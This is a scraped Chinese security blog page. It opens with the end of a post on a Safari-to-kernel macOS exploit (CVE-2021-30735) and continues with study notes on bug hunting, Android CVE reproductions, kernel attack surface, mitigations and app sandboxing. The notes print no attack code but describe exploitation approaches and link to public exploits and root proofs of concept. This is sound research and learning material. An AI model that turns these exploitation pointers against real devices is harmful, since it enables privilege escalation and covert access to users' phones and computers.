<p><code>shellcode</code>重写了内核版本字符串（可通过<code>uname -a</code>查看），取消了当前进程（<code>Apple Safari</code>）的沙盒，并给予它<code>root</code>证书。漏洞利用在<a target="_blank" rel="noopener" href="https://github.com/ret2/Pwn2Own-2021-Safari/blob/main/eop/kernel_sc.c">这里</a>。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个漏洞最困难的部分可能是对信息泄露的需求，这使得这个漏洞偏离了重点，绕过了端口的<code>zone_require</code>缓解。自<code>Pwn2Own 2021</code>以来，沙盒的变化禁止了某些函数调用，这使得这种技术在Safari沙盒中是可行的，尽管有可能稍微修改该技术以绕过这些新限制。</p>
<p>这里讨论的漏洞已经在<code>macOS Big Sur 11.4</code>中打了补丁，并分配了<code>CVE-2021-30735</code>。</p>
<h1 id="复现情况"><a href="#复现情况" class="headerlink" title="复现情况"></a>复现情况</h1><p>虚拟机中运行会说找不到<code>IntelAccelerator</code>这个服务，好像是和虚拟机没有启用3D图形加速有关，但是VMware设置时显示无法为这个虚拟机开启图形加速，或许应该换PD试一试，另外，本地测试获取这个服务是没问题的。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/06/25/%E6%88%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%F0%9F%93%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/06/25/%E6%88%91%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%F0%9F%93%99/" class="post-title-link" itemprop="url">我的漏洞学习笔记📙</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2022-06-25 10:47:19" itemprop="dateCreated datePublished" datetime="2022-06-25T10:47:19+08:00">2022-06-25</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">Edited on</span>
      <time title="Modified: 2022-07-03 22:32:29" itemprop="dateModified" datetime="2022-07-03T22:32:29+08:00">2022-07-03</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>漏洞的学习要有连续性，多记录，多总结，多回顾。</p>
<h1 id="🌟漏洞学习方法"><a href="#🌟漏洞学习方法" class="headerlink" title="🌟漏洞学习方法"></a>🌟漏洞学习方法</h1><p>以下要说的漏洞挖掘方法都是从<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=7Ysy6iA2sqA">OffensiveCon22 - Mark Dowd- Keynote -How Do You Actually Find Bugs?</a>学的，个人感觉是贴合实际的，也很具有可执行性。</p>
<h2 id="1、心态"><a href="#1、心态" class="headerlink" title="1、心态"></a>1、心态</h2><p><strong>耐心、毅力、细心、思考、好奇心</strong></p>
<p>要有一个积极的心态，就是当发现代码的逻辑与自己的理解有很大不同时，能接受失败，从头再来。</p>
<p>漏洞挖掘就是一个不断失败的过程。</p>
<h3 id="如何处理失败？"><a href="#如何处理失败？" class="headerlink" title="如何处理失败？"></a>如何处理失败？</h3><ol>
<li>两个项目同时进行，这两个项目可以是相同代码的不同组件，当一个项目到达瓶颈时，搁置一段时间，进行另一个项目；</li>
<li>第二个项目最好是开发项目，开发容易获得成就感。</li>
</ol>
<h3 id="知道什么时候该结束"><a href="#知道什么时候该结束" class="headerlink" title="知道什么时候该结束"></a>知道什么时候该结束</h3><ol>
<li>当切换了几次，还是无法突破瓶颈时；<ol>
<li>一直持续到针对一个问题，会很容易打击积极性和信息。</li>
</ol>
</li>
<li>不要在意沉没成本，可以当作只是暂时搁置，时机合适时再来，这需要对已做的工作做好记录，防止下次进入时又从头再来；</li>
<li>而且，过段时间再来，代码可能就由于更新引入了新的问题。</li>
</ol>
<p>不要想着一口吃个胖子，思考很重要，只有主动思考代码的实现思想，才能减少审计时间，就是主动去猜去想。</p>
<h3 id="补丁"><a href="#补丁" class="headerlink" title="补丁"></a>补丁</h3><ol>
<li>审计时发现补丁说明思考的路径是正确的，还有助于理解问题与解决问题。</li>
</ol>
<h3 id="信心"><a href="#信心" class="headerlink" title="信心"></a>信心</h3><p>初次踏入安全研究会很容易不自信，应该从小处做起，逐渐扩大，以增加信心。</p>
<h3 id="偏见和假设"><a href="#偏见和假设" class="headerlink" title="偏见和假设"></a>偏见和假设</h3><p>这些思想不要有：</p>
<ol>
<li>有很多人审计过这一块了；<ol>
<li>其实可能并没有。</li>
</ol>
</li>
<li>即使我能发现问题，也是不可利用的；<ol>
<li>缓解措施或许可以绕过。</li>
</ol>
</li>
<li>XXX攻击面现在已经过时了；</li>
<li>这儿没什么bugl；<ol>
<li>变体或代码重新引入bug。</li>
</ol>
</li>
<li>协议不允许做XXX动作。</li>
<li>不要一开始就阅读文档手册，会影响想象力，当审计遇到模棱两可的时候，在看手册。</li>
</ol>
<h2 id="2、审计流程"><a href="#2、审计流程" class="headerlink" title="2、审计流程"></a>2、审计流程</h2><ol>
<li>试图理解代码，理解代码以后，才能更好地写出漏洞利用；<ol>
<li>一般都想要缩短这个过程，借助工具、fuzz、静态分析等，这些有用，但是很依赖于工具本身。</li>
</ol>
</li>
<li>理解一件事最好的方式是向他人讲解这个东西；<ol>
<li>写文章或是找个人分享。</li>
</ol>
</li>
</ol>
<h3 id="寻找什么？"><a href="#寻找什么？" class="headerlink" title="寻找什么？"></a>寻找什么？</h3><p>软件风险点 &#x3D; 供给面X复杂度（漏挖之友）</p>
<p>攻击面可以是间接的，隐藏或不明显的攻击面是最好的，供应商自定义的那些。</p>
<p>复杂度：</p>
<ol>
<li>新的功能；</li>
<li>对旧东西的兼容；</li>
<li>为了开发简单，使用现有库等，引入自己不需要的东西，如<code>log4j</code>。</li>
</ol>
<h3 id="借用想法"><a href="#借用想法" class="headerlink" title="借用想法"></a>借用想法</h3><ol>
<li>bugtracker&#x2F;diff，关注经常写bug的那个人的提交；</li>
<li>看看公开漏洞，借鉴思路，复现思路，自动化。</li>
</ol>
<h3 id="记录自己的发现"><a href="#记录自己的发现" class="headerlink" title="记录自己的发现"></a>记录自己的发现</h3><p>想法、bug条件、数据结构、算法等等都可以，记录失败的想法及原因，避免再犯这个错误。</p>
<h3 id="广泛的应用自己的知识"><a href="#广泛的应用自己的知识" class="headerlink" title="广泛的应用自己的知识"></a>广泛的应用自己的知识</h3><p>审计复杂的组件时，去看看其他人如何实现它的，还有，当难以理解组件时，可以查看不同的代码库，说不定能理解。</p>
<h3 id="重启失败的项目"><a href="#重启失败的项目" class="headerlink" title="重启失败的项目"></a>重启失败的项目</h3><p>重启之前失败的审计或bug，代码会被重写，会添加新特性，执行环境也会变，查看当时不可行的bug，现在是否依然不可行。</p>
<h2 id="3、分析失败"><a href="#3、分析失败" class="headerlink" title="3、分析失败"></a>3、分析失败</h2><ol>
<li>同一块代码为什么别人成功而你没有？</li>
<li>试着找出：我忽视了什么？</li>
<li>这是一个有用的技巧或是自己盲点吗？</li>
<li>通过这个能有所提高吗？</li>
<li>这个错误是一种模式吗？</li>
</ol>
<h2 id="4、借助工具"><a href="#4、借助工具" class="headerlink" title="4、借助工具"></a>4、借助工具</h2><p>工具、fuzz、静态分析等可以节省大量时间，但别迷失在工具中，开发一个fuzz不要急于求成，可以让其慢慢成长，工具与代码审计之间要找到平衡。</p>
<h1 id="🌟代码审计"><a href="#🌟代码审计" class="headerlink" title="🌟代码审计"></a>🌟代码审计</h1><h1 id="🌟漏洞复现"><a href="#🌟漏洞复现" class="headerlink" title="🌟漏洞复现"></a>🌟漏洞复现</h1><h2 id="CVE-2020-0108"><a href="#CVE-2020-0108" class="headerlink" title="CVE-2020-0108"></a>CVE-2020-0108</h2><p>要想实现自动化，这个漏洞需要：</p>
<ol>
<li>构造输入，触发异常；</li>
<li>在应用程序端接受异常；</li>
<li>判断是否可利用。</li>
</ol>
<h2 id="CVE-2021-0694"><a href="#CVE-2021-0694" class="headerlink" title="CVE-2021-0694"></a>CVE-2021-0694</h2><p>下面是已知的一些信息：</p>
<p><code>BG-FGS-start while-in-use</code>权限限制的改进。</p>
<p>从后台启动的前台服务不应具有<code>while-in-use</code>的访问权限，如定位&#x2F;摄像&#x2F;麦克风。</p>
<p>以前我们只在服务启动时通过<code>startService()</code>或<code>bindService()</code>命令设置<code>mAllowWhileInUsePermissionInFgs</code>。但是在 服务启动后，<code>Service.startForeground()</code>的调用可能会在一段时间后进行。而那个时候，调用者可能已经不在前台了。<br>这个 CL将在此基础上增加进一步的限制：</p>
<ol>
<li>如果第一次调用<code>Service.startForeground()</code>超过10秒（可由<code>DeviceConfig</code>键 <code>fgs_start_foreground_timeout </code>配置）。<code>Context.startService()</code>调用后，检查服务的应用程序状态并设置 <code>mAllowWhileInUsePermissionInFgs</code>。</li>
<li>在<code>Service.stopForeground()</code>调用时，<code>mAllowWhileInUsePermissionInFgs</code> 应该被重置为false，这样<code>FGS</code>的<code>while-in-use</code>的权限就不被允许了。</li>
<li>在<code>Context.startForegroundService()</code>(或<code>Context.startService())</code>之后<code>-&gt; Service.startForeground() -&gt; Service.stopForeground()</code>，第二次或更多次 调用<code>Service.startForeground()</code>，检查该服务的 <code>app proc</code>状态，并再次设置<code>mAllowWhileInUsePermissionInFgs</code>。</li>
</ol>
<h3 id="复现情况"><a href="#复现情况" class="headerlink" title="复现情况"></a>复现情况</h3><p>可以看出问题应该与<code>mAllowWhileInUsePermissionInFgs</code>有关，但是奈何对<code>service</code>的启动还有框架源码的理解不够，写不出来<code>poc</code>。暂时先搁置一下，再看看有没有类似的漏洞，找找思路，或者是再积累一些知识。</p>
<p>又试了一下，还是不对，可能需要看看源码了。</p>
<p><code>poc</code>写了，也跑了一下，当程序不在前台时获取录音，也成功了，但是不好证伪，因为，官方的Android11镜像应该都是没有修复的，而漏洞又只影响Android11，所以不好去测试补丁后的情况。</p>
<h2 id="CVE-2019-2225"><a href="#CVE-2019-2225" class="headerlink" title="CVE-2019-2225"></a>CVE-2019-2225</h2><p>配置错误导致的严重漏洞，也很有意思，关键是可以通过应用程序直接进行攻击</p>
<h2 id="CVE-2020-0069"><a href="#CVE-2020-0069" class="headerlink" title="CVE-2020-0069"></a>CVE-2020-0069</h2><p>驱动漏洞：</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/217231">https://www.anquanke.com/post/id/217231</a></p>
<p><a target="_blank" rel="noopener" href="https://forum.xda-developers.com/t/amazing-temp-root-for-mediatek-armv8-2020-08-24.3922213/">https://forum.xda-developers.com/t/amazing-temp-root-for-mediatek-armv8-2020-08-24.3922213/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html">https://blog.quarkslab.com/cve-2020-0069-autopsy-of-the-most-stable-mediatek-rootkit.html</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/quarkslab/CVE-2020-0069_poc">https://github.com/quarkslab/CVE-2020-0069_poc</a></p>
<h1 id="🌟工具开发"><a href="#🌟工具开发" class="headerlink" title="🌟工具开发"></a>🌟工具开发</h1><h2 id="Android静态漏洞扫描工具"><a href="#Android静态漏洞扫描工具" class="headerlink" title="Android静态漏洞扫描工具"></a>Android静态漏洞扫描工具</h2><p>以soot为基础进行的，现在也只进行到能获取一些AndroidManifest数据，没有进行到下一步的原因是：一是想做界面，但是和Java后端又不会，成本很高；二是，还没有想好要怎么继续分析，或者说功能要怎么开发。</p>
<h2 id="💡想法"><a href="#💡想法" class="headerlink" title="💡想法"></a>💡想法</h2><p>虽然<code>PendingIntent</code>增加了<code>PendingIntent.FLAG_IMMUTABLE</code>标志，但是，可以想办法监听系统中发送的<code>PendingIntent</code>，看哪个倒霉催的程序员不适用这个标志，或许这种漏洞真是绝了，也说不定。</p>
<h1 id="Android内核知识"><a href="#Android内核知识" class="headerlink" title="Android内核知识"></a>Android内核知识</h1><h2 id="1、Android内核简介"><a href="#1、Android内核简介" class="headerlink" title="1、Android内核简介"></a>1、Android内核简介</h2><ul>
<li><code>EL0</code>层：普通<code>Application</code>、<code>TA (Trusted Application)</code>；</li>
<li><code>EL1</code>层：<code>Linux</code>内核 (<code>Guest OS</code>)、<code>TEE</code>内核 (<code>Trusted OS</code>)；</li>
<li><code>EL2</code>层：<code>Hypervisor (No Hypervisor in Secure World)</code>；</li>
<li><code>EL3</code>层：<code>Secure Monitor</code>；</li>
<li>不同的<code>EL</code>对应不同的权限，不同的寄存器，高权限的行为在低<code>EL</code>上是不能执行的；</li>
<li>常见安全问题：低权限攻击高权限、非安全侧攻击安全侧。</li>
</ul>
<h2 id="2、内核内存"><a href="#2、内核内存" class="headerlink" title="2、内核内存"></a>2、内核内存</h2><ul>
<li>单个进程角度：低地址为<code>user</code>内存，高地址（<code>TASK_SIZE</code>以上）为<code>kernel</code>内存；</li>
<li>系统角度：内核地址是共享的，各个进程地址隔离。</li>
</ul>
<h2 id="3、内核接口"><a href="#3、内核接口" class="headerlink" title="3、内核接口"></a>3、内核接口</h2><ul>
<li><code>EL0</code>调用<code>EL1</code>方法：通过中断指令，内核进入中断向量表，再通过系统调用号进入各类系统调用；</li>
<li><code>ARM</code>中的指令：<code>svc</code>；</li>
<li><code>libc.so</code>里面所有系统调用都会用到<code>DO_CALL</code>这个宏，包括但不限于：<code>open</code>, <code>read</code>, <code>write</code>, <code>fork</code>,<code> ioctl</code>等；</li>
<li>虚拟文件系统（<code>VFS</code>）：所有的驱动程序都是通过文件进行调用的。</li>
</ul>
<h2 id="4、识别攻击面"><a href="#4、识别攻击面" class="headerlink" title="4、识别攻击面"></a>4、识别攻击面</h2><ul>
<li>入口：<code>/dev</code>、<code>/proc</code>等驱动，系统调用；</li>
<li>内存操作函数：<code>put_user</code>, <code>get_user</code>, <code>copy_to_user</code>, <code>clear_user</code>, <code>copy_from_user</code>, <code>strncpy_from_user</code>；</li>
<li>驱动：经常用到的比如字符设备驱动、网络设备驱动以及<code>NetLink</code>等<ul>
<li>重要结构体：<code>file_operations</code>；</li>
<li><code>read/write</code>函数：内核<code>VFS</code>框架里，<code>count</code>是被校验过的；</li>
<li><code>ioctl</code>：<code>arg</code>是一个指针，没有标准的类型，<code>VFS</code>框架无法校验，如何使用全部取决于开发人员；</li>
<li><code>mmap</code>：内核驱动需实现<code>xxxx_mmap</code>，最终调用到<code>remap_pfn_range</code>。</li>
</ul>
</li>
</ul>
<h2 id="5、内核缓解机制"><a href="#5、内核缓解机制" class="headerlink" title="5、内核缓解机制"></a>5、内核缓解机制</h2><ul>
<li><code>KASLR</code>：内核地址随机化；</li>
<li><code>NX</code>：数据区不可执行；</li>
<li>栈<code>Cookie</code>：返回地址之前的随机数，覆盖返回地址之前会先覆盖<code>Cookie</code>；</li>
<li><code>SELinux</code>：基于策略的保护方式；</li>
<li><code>PXN</code>：内核态不能执行用户态地址的代码；</li>
<li><code>PAN</code>：内核态不能访问用户态地址数据；</li>
<li><code>CFI</code>：控制流完整性，只有特定流才能调用。</li>
</ul>
<h1 id="Android应用沙盒机制"><a href="#Android应用沙盒机制" class="headerlink" title="Android应用沙盒机制"></a>Android应用沙盒机制</h1><h2 id="1、DAC沙盒"><a href="#1、DAC沙盒" class="headerlink" title="1、DAC沙盒"></a>1、DAC沙盒</h2><ul>
<li><code>Android</code>上的<code>App</code>并不像<code>Linux</code>上的用户程序那样，启动应用的<code>uid</code>默认就是登录用户的<code>uid</code>，除非你使用<code>sudo</code>或者<code>setuid</code>等机制。而是每个<code>Android</code>应用都对应了一个<code>uid</code>，也就是一个用户，通过<code>Linux</code>系统的<code>DAC</code>机制将应用的数据严格隔离开来。</li>
<li><code>Android</code>并没有使用<code>/etc/passwd</code>配置文件以及<code>useradd</code>、<code>usermod</code>和<code>userdel</code>等二进制来管理用户。实际上<code>Android</code>应用到<code>uid</code>的映射是由<code>PackageManagerService</code>完成的，也就是<code>PMS</code>，并且存储在<code>/data/system/packages.xml</code>中。</li>
<li>将<code>Android</code>应用使用<code>DAC</code>隔离开之后，如果应用要访问任何系统资源，便会被拒绝，所以<code>Android</code>设计了应用权限机制来向应用提供访问系统资源的通道，同时保护系统资源不被滥用。</li>
</ul>
<h2 id="2、应用权限"><a href="#2、应用权限" class="headerlink" title="2、应用权限"></a>2、应用权限</h2><ul>
<li><code>Android</code>应用权限的核心类型分为四种：普通权限、危险权限、签名权限、签名或系统权限。</li>
</ul>
<table>
<thead>
<tr>
<th>权限类型</th>
<th>权限行为</th>
</tr>
</thead>
<tbody><tr>
<td>普通权限(<code>Normal</code>)</td>
<td>普通权限是只需要在<code>AndroidManifest.xml</code>中声明后就可以使用的权限</td>
</tr>
<tr>
<td>危险权限(<code>dangerous</code>)</td>
<td>危险权限除了需要在<code>AndroidManifest.xml</code>中声明之外，在<code>Android 6.0</code>或更高版本还需要使用动态权限API进行申请，并且用户点击同意之后才能使用；在<code>Android 5.1</code>以及更早版本，会在安装时单独列出危险权限以特别提醒用户。<strong>注意，如果自定义权限设置为了危险权限，无论<code>Android</code>版本是多少都只是会在安装时单独列出危险权限。</strong></td>
</tr>
<tr>
<td>签名权限(<code>signature</code>)</td>
<td>签名权限仅会授予给与定义这个权限的包相同签名的应用。</td>
</tr>
<tr>
<td>签名或系统权限(<code>signatureOrSystem</code>)</td>
<td>&#96;signature</td>
</tr>
</tbody></table>
<ul>
<li>在自定义权限中，经常使用<code>signature</code>权限来保护敏感的接口，使其只能被可信的应用调用——那些具备和定义权限者相同签名的应用，如果使用的是<code>signatureOrSystem</code>，这个权限还可以被授予给特权应用。</li>
</ul>
<h2 id="3、应用信息的存储"><a href="#3、应用信息的存储" class="headerlink" title="3、应用信息的存储"></a>3、应用信息的存储</h2><ul>
<li>应用信息的存储位于<code>/data/system/packages.xml</code>中，这里面存储了应用的各种信息，下面是一个示例：</li>
</ul>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.android.storagemanager&quot;</span> <span class="attr">codePath</span>=<span class="string">&quot;/system/priv-app/StorageManager&quot;</span> <span class="attr">nativeLibraryPath</span>=<span class="string">&quot;/system/priv-app/StorageManager/lib&quot;</span> <span class="attr">publicFlags</span>=<span class="string">&quot;541605445&quot;</span> <span class="attr">privateFlags</span>=<span class="string">&quot;8&quot;</span> <span class="attr">ft</span>=<span class="string">&quot;165151eba60&quot;</span> <span class="attr">it</span>=<span class="string">&quot;165151eba60&quot;</span> <span class="attr">ut</span>=<span class="string">&quot;165151eba60&quot;</span> <span class="attr">version</span>=<span class="string">&quot;29&quot;</span> <span class="attr">userId</span>=<span class="string">&quot;10036&quot;</span> <span class="attr">appUseNotchMode</span>=<span class="string">&quot;0&quot;</span> <span class="attr">appUseSideMode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">hwExtraFlags</span>=<span class="string">&quot;0&quot;</span> <span class="attr">isOrphaned</span>=<span class="string">&quot;true&quot;</span> <span class="attr">forceDarkMode</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sigs</span> <span class="attr">count</span>=<span class="string">&quot;1&quot;</span> <span class="attr">schemeVersion</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">cert</span> <span class="attr">index</span>=<span class="string">&quot;13&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">sigs</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">perms</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;android.permission.USE_RESERVED_DISK&quot;</span> <span class="attr">granted</span>=<span class="string">&quot;true&quot;</span> <span class="attr">flags</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">perms</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">proper-signing-keyset</span> <span class="attr">identifier</span>=<span class="string">&quot;3&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">package</span> <span class="attr">name</span>=<span class="string">&quot;com.android.settings&quot;</span> <span class="attr">codePath</span>=<span class="string">&quot;/system/priv-app/Settings&quot;</span> <span class="attr">nativeLibraryPath</span>=<span class="string">&quot;/system/priv-app/Settings/lib&quot;</span> <span class="attr">publicFlags</span>=<span class="string">&quot;675823173&quot;</span> <span class="attr">privateFlags</span>=<span class="string">&quot;8&quot;</span> <span class="attr">ft</span>=<span class="string">&quot;165151eba60&quot;</span> <span class="attr">it</span>=<span class="string">&quot;165151eba60&quot;</span> <span class="attr">ut</span>=<span class="string">&quot;165151eba60&quot;</span> <span class="attr">version</span>=<span class="string">&quot;10010400&quot;</span> <span class="attr">sharedUserId</span>=<span class="string">&quot;1000&quot;</span> <span class="attr">appUseNotchMode</span>=<span class="string">&quot;0&quot;</span> <span class="attr">appUseSideMode</span>=<span class="string">&quot;1&quot;</span> <span class="attr">hwExtraFlags</span>=<span class="string">&quot;0&quot;</span> <span class="attr">isOrphaned</span>=<span class="string">&quot;true&quot;</span> <span class="attr">forceDarkMode</span>=<span class="string">&quot;2&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">sigs</span> <span class="attr">count</span>=<span class="string">&quot;1&quot;</span> <span class="attr">schemeVersion</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">cert</span> <span class="attr">index</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">sigs</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">perms</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">item</span> <span class="attr">name</span>=<span class="string">&quot;android.permission.REAL_GET_TASKS&quot;</span> <span class="attr">granted</span>=<span class="string">&quot;true&quot;</span> <span class="attr">flags</span>=<span class="string">&quot;0&quot;</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- ... --&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">perms</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">proper-signing-keyset</span> <span class="attr">identifier</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">package</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到这个文件中存储有很多内容，最关键的信息包括应用的<code>uid</code>、包名、各类路径，以及定义和授予的权限。</p>
<h2 id="4、应用权限的映射"><a href="#4、应用权限的映射" class="headerlink" title="4、应用权限的映射"></a>4、应用权限的映射</h2><p><code>Android</code>使用的是<code>Linux</code>内核，而在<code>Linux</code>的安全模型中，如果需要访问系统资源，访问系统资源的用户和进程必须具备相应的权限。如何将自行定义的<code>Android</code>权限映射到<code>Linux</code>层面的权限呢？答案就位于<code>/etc/permissions/platform.xml</code>中，下面是该文件的节选：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">permission</span> <span class="attr">name</span>=<span class="string">&quot;android.permission.BLUETOOTH_ADMIN&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">group</span> <span class="attr">gid</span>=<span class="string">&quot;net_bt_admin&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">permission</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">permission</span> <span class="attr">name</span>=<span class="string">&quot;android.permission.BLUETOOTH&quot;</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">group</span> <span class="attr">gid</span>=<span class="string">&quot;net_bt&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">permission</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>Android</code>的两个蓝牙权限，分别对应了<code>net_bt_admin</code>和<code>net_bt</code>两个<code>Linux</code>组，在应用被授予相应的权限时，<code>PMS</code>会自动将应用<code>uid</code>加入这两个组中，这样应用就拥有了相应系统资源的访问权限了。</p>
<h2 id="5、应用的SELinux标签"><a href="#5、应用的SELinux标签" class="headerlink" title="5、应用的SELinux标签"></a>5、应用的SELinux标签</h2><p>在<code>Android</code>引入<code>SELinux</code>之后，对应用权限的划分更为细致，<code>Android</code>默认将应用分为四种：不可信应用、特权应用、平台应用和系统应用。</p>
<table>
<thead>
<tr>
<th>SELinux标签</th>
<th>标签行为</th>
</tr>
</thead>
<tbody><tr>
<td>app_domain</td>
<td>所有应用的<code>SELinux</code>标签都继承于此</td>
</tr>
<tr>
<td>isolated_app</td>
<td>在Manifest中配置了<code>isolatedProcess=true</code>的服务进程，几乎没有特权，最典型的例子是<code>WebView</code>和浏览器的渲染进程</td>
</tr>
<tr>
<td>ephemeral_app</td>
<td>所有用户使用的免安装应用都属于此标签，权限低于一般的第三方应用</td>
</tr>
<tr>
<td>untrusted_app_all</td>
<td>所有用户安装的应用都属于此标签，还包括一部分预装应用</td>
</tr>
<tr>
<td>untrusted_app_29</td>
<td><code>targetSdkVersion = 29</code>的不可信应用</td>
</tr>
<tr>
<td>untrusted_app_27</td>
<td><code>25 &lt; targetSdkVersion &lt;= 28</code>的不可信应用</td>
</tr>
<tr>
<td>untrusted_app_25</td>
<td><code>targetSdkVersion &lt;= 25</code>的不可信应用</td>
</tr>
<tr>
<td>priv_app</td>
<td>带有<code>Privileged</code>标记的预装应用，一般安装在<code>/system/priv-app</code>中，不可卸载，但不以<code>system uid</code>运行</td>
</tr>
<tr>
<td>platform_app</td>
<td>具备平台签名，但不以<code>system uid</code>运行的应用。除了AOSP和部分第三方ROM之外，几乎所有的OEM都不会公开其平台私钥，所以一般情况下平台应用只能是OEM提供的</td>
</tr>
<tr>
<td>system_app</td>
<td>既具备平台签名，又以<code>system uid</code>运行(配置<code>android:sharedUserId=”android.uid.system”</code>)的应用。使用<code>system uid</code>运行意味着它们实际不受应用沙盒的限制，并能访问绝大部分<code>Android</code>框架中的系统资源</td>
</tr>
</tbody></table>
<p>具体的配置路径为：<code>aosp/system/sepolicy/</code>，也可以看<code>git</code>上的信息：<a target="_blank" rel="noopener" href="https://android.googlesource.com/platform/external/sepolicy/%E3%80%82">https://android.googlesource.com/platform/external/sepolicy/。</a></p>
<h2 id="6、MAC沙盒"><a href="#6、MAC沙盒" class="headerlink" title="6、MAC沙盒"></a>6、MAC沙盒</h2><p>上面所说的<code>SELinux</code>标签，<code>Android</code>在源代码中为它们定义了不同的<code>SELinux</code>政策，这便实现了<code>MAC</code>层面的沙盒增强。这些政策的路径如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">system/sepolicy/public/app.te</span><br><span class="line">system/sepolicy/private/app.te</span><br><span class="line">system/sepolicy/private/isolated_app.te</span><br><span class="line">system/sepolicy/private/ephemeral_app.te</span><br><span class="line">system/sepolicy/private/untrusted_app_all.te</span><br><span class="line">system/sepolicy/private/untrusted_app_29.te</span><br><span class="line">system/sepolicy/private/untrusted_app_27.te</span><br><span class="line">system/sepolicy/private/untrusted_app_25.te</span><br><span class="line">system/sepolicy/private/priv_app.te</span><br><span class="line">system/sepolicy/private/platform_app.te</span><br><span class="line">system/sepolicy/private/system_app.te</span><br></pre></td></tr></table></figure>

<p>一般来说不建议<code>App</code>层面直接访问具备独立标签的用户态进程或者内核驱动，因为<code>App</code>的<code>SELinux</code>标签划分并非像<code>UID</code>一样细致，如果这样做会导致授予某一个应用权限的时候必须授予应用所在的整个标签权限，违反权限最小化原则。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
